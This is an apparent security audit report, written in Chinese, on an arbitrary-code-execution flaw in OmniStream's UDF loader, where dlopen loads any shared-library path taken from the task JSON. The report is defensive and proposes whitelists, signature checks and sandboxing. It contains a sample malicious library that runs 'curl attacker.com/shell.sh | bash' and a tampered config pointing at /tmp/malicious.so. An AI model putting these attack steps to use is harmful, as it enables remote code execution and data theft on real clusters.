# 漏洞深度分析报告：UDF dlopen 任意代码执行

## 漏洞标识

| 属性 | 值 |
|------|-----|
| **漏洞 ID** | SEC-004 |
| **严重程度** | **Critical（严重）** |
| **置信度** | 75% |
| **CWE 编号** | CWE-94（代码注入） |
| **涉及模块** | core_udf, jni, streaming_runtime_tasks（跨模块） |

---

## 一、漏洞概述

本漏洞是一个严重的代码注入漏洞，攻击者可通过篡改任务部署描述符（TDD）JSON 中的 UDF 库路径，使得 OmniStream 加载并执行恶意共享库（.so 文件），实现任意代码执行。

`UDFLoader` 类使用 `dlopen()` 动态加载用户定义函数（UDF）的共享库。库文件路径（`filePath`）来自任务配置中的 `config["udf_so"]` 字段，该配置是从 Java JobManager 通过 JNI 传递的 TDD JSON 解析而来。如果攻击者能够：
1. 篡改 TDD JSON 内容
2. 或在 JobManager 被入侵场景下控制任务配置
3. 或通过其他漏洞注入配置

即可指定一个恶意共享库路径，使得 TaskExecutor 加载并执行任意代码。

### 具体攻击步骤

1. **准备恶意共享库**
   ```cpp
   // malicious.cpp - 恶意 UDF 库源码
   #include <cstdlib>
   #include "functions/MapFunction.h"
   
   extern "C" {
       MapFunctionUnique<Object> NewInstance(nlohmann::json config) {
           // 执行恶意代码
           system("curl attacker.com/shell.sh | bash");
           // 窃取数据
           exfiltrateData();
           // 植入后门
           installBackdoor();
           // 返回正常功能以隐藏
           return std::make_unique<NormalMapFunction>(config);
       }
   }
   ```
   
   编译为共享库：
   ```bash
   g++ -shared -fPIC -o malicious.so malicious.cpp
   ```

2. **篡改 TDD JSON**
   ```json
   {
     "operators": [
       {
         "type": "StreamMap",
         "config": {
           "udf_so": "/tmp/malicious.so",
           "udf_obj": "{\"param\": \"value\"}"
         }
       }
     ]
   }
   ```

3. **触发漏洞**
   - 通过 JobManager API 提交篡改后的任务
   - 或在 JobManager 被入侵后直接修改任务配置
   - 或利用中间人攻击修改网络传输的 TDD

4. **代码执行**
   - TaskExecutor 接收任务
   - 解析 TDD JSON
   - 创建 StreamMap operator
   - `loadUdf()` 提取 `config["udf_so"]`
   - `dlopen()` 加载恶意库
   - `dlsym()` 获取 `NewInstance` 函数
   - 执行恶意代码

## 四、潜在影响范围

### 直接影响

1. **任意代码执行**
   - 在 TaskExecutor 进程上下文执行任意代码
   - 权限等同于 TaskExecutor 进程权限
   - 可执行系统命令、访问文件系统、网络通信

2. **数据窃取**
   - 访问流处理中的敏感数据
   - 窃取状态存储中的数据
   - 获取 Kafka 消息内容

3. **系统入侵**
   - 植入后门
   - 获取持久化访问
   - 作为跳板攻击其他节点

### 间接影响

1. **集群沦陷**：攻击者可控制所有 TaskExecutor
2. **数据泄露**：所有流经的数据可被窃取
3. **供应链攻击**：恶意库可能扩散到其他系统

## 五、代码证据

### 关键代码片段

#### 1. UDFLoader::LoadUDFFunction（漏洞触发点）

```cpp
// cpp/core/udf/UDFLoader.h
// Line 129-157
template<typename FuncType>
FuncType* LoadUDFFunction(const std::string &filePath, const std::string &funcSignature)
{
    // **危险**：直接使用 filePath 参数，无任何验证
    void* handle = dlopen(filePath.c_str(), RTLD_LAZY);  // Line 131
    if (not handle) {
        std::cerr << "Error loading library: " << dlerror() << std::endl;
        return nullptr;
    }

    // 获取函数指针
    FuncType *funcPointer = (FuncType *)dlsym(handle, funcSignature.c_str());  // Line 137
    
    // ... 无签名验证，无白名单检查
    
    return funcPointer;  // 返回可执行的函数指针

```

**安全问题分析**：
- `filePath` 直接从配置获取，无路径验证
- 无签名验证机制
- 无白名单机制限制可加载的库
- 无沙箱隔离执行环境

### 紧急修复（优先级 P0）

#### 1. UDF 路径白名单

```cpp
// cpp/core/udf/UDFLoader.h
class UDFWhitelist {
private:
    std::set<std::string> allowedPaths;
    std::set<std::string> allowedHashes;  // SHA256
    
public:
    bool isAllowed(const std::string& path) {
        // 1. 检查路径白名单
        std::string canonicalPath = std::filesystem::canonical(path);
        if (allowedPaths.find(canonicalPath) == allowedPaths.end()) {
            return false;
        }
        
        // 2. 检查文件签名（可选）
        if (!verifySignature(path)) {
            return false;
        }
        
        return true;
    }
};
```

```cpp
bool isValidUdfPath(const std::string& path) {
    // 1. 检查路径是否在允许的目录
    if (!path.starts_with("/opt/omnistream/udf/")) {
        return false;
    }
    
    // 2. 检查路径是否包含可疑字符（防止路径遍历）
    if (path.find("..") != std::string::npos) {
        return false;
    }
    
    // 3. 检查文件扩展名
    if (!path.ends_with(".so")) {
        return false;
    }
    
    return true;
}
```

### 长期修复（优先级 P1）

#### 1. UDF 签名机制

```cpp
// 添加 UDF 签名验证
class UDFSignatureVerifier {
public:
    bool verify(const std::string& path) {
        // 使用 GPG 或内部签名机制验证
        std::string signatureFile = path + ".sig";
        
        // 读取签名和公钥
        std::vector<uint8_t> signature = readFile(signatureFile);
        std::vector<uint8_t> publicKey = getPublicKey();
        
        // 计算文件哈希
        std::string fileHash = computeSHA256(path);
        
        // 验证签名
        return verifySignature(signature, publicKey, fileHash);
    }
};
```

#### 2. UDF 沙箱隔离

```cpp
// 使用 seccomp 或 namespace 隔离 UDF 执行
class UDFSandbox {
public:
    void executeInSandbox(void* handle, FuncType* func) {
        // 1. 创建沙箱进程
        pid_t pid = fork();
        if (pid == 0) {
            // 子进程：设置 seccomp 限制
            setupSeccompFilter();
            
            // 执行 UDF 函数
            func(config);
            
            _exit(0);
        }
        
        // 父进程：等待结果
        int status;
        waitpid(pid, &status, 0);
    }
};
```

## 七、验证方法

### 安全测试用例

```cpp
TEST(UDFLoaderSecurity, PathTraversal) {
    UDFLoader loader;
    std::string maliciousPath = "/opt/omnistream/../../../tmp/malicious.so";
    
    EXPECT_THROW(loader.LoadMapFunction(maliciousPath), std::invalid_argument);
}

TEST(UDFLoaderSecurity, WhitelistEnforcement) {
    UDFLoader loader;
    std::string allowedPath = "/opt/omnistream/udf/valid.so";
    std::string blockedPath = "/tmp/malicious.so";
    
    EXPECT_NO_THROW(loader.LoadMapFunction(allowedPath));
    EXPECT_THROW(loader.LoadMapFunction(blockedPath), std::invalid_argument);
}

TEST(UDFLoaderSecurity, SignatureVerification) {
    // 使用未签名的库
    std::string unsignedPath = "/opt/omnistream/udf/unsigned.so";
    EXPECT_THROW(loader.LoadMapFunction(unsignedPath), std::invalid_argument);
    
    // 使用已签名的库
    std::string signedPath = "/opt/omnistream/udf/signed.so";
    EXPECT_NO_THROW(loader.LoadMapFunction(signedPath));
}
```
